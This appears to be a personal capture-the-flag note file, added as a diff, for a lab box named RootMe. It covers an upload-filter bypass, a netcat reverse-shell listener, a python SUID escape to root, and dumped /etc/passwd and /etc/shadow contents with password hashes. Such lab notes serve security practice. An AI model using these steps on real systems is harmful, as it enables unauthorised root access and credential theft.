@@ -1,0 +1,119 @@
+
+					Recon
+
+*can upload onwebserver
+
+
+
+
+
+					Shell
+
+$nc -lvnp 4444
+
+*change rphp.php > rphp.php5
+
+*execute in /uploads
+
+$cat /var/www/user.txt
+
+
+
+					Privesc
+
+
+find / -user root -perm /4000
+
+
+/usr/bin/python
+
+
+*consult gtfobins
+
+*use the suid method
+
+(on target machine since they have python)
+
+$./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+*gotta run it in python's path of origin
+
+$./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+$cat /root/root.txt
+
+
+
+
+					Shits and gigs
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+test:x:1001:1001:,,,:/home/test:/bin/bash
+
+
+
+
+
+root:$6$5osB44J2$24WV3zAR1FTqEq3f2kSqrigUgyDmKucU8rwHvbOJWxIoWSlHbVHV1Ug1eOHqidieZWDU3Y5V3cimChun2JYNw1:18478:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+rootme:$6$jzeDDmrVeqMMEQqv$j8jwWy951YwWBJWzQNn.A45I.8H06/QOv4qocX.hNDdT42NytyavSHxlxoEh0ek2OS4NX27tuuZRTJuHPSWCp.:18478:0:99999:7:::
+sshd:*:18478:0:99999:7:::
+test:$6$vXOyvOWZ$UpIjnJq/KuKmKHezW/pEM.nrI6QuqhWWlv/fUmLvJI1YG7nju2vpP3vg1Q0SSf5FCk8058WD5Rc3XXPMRlqHb0:18478:0:99999:7:::
+
+
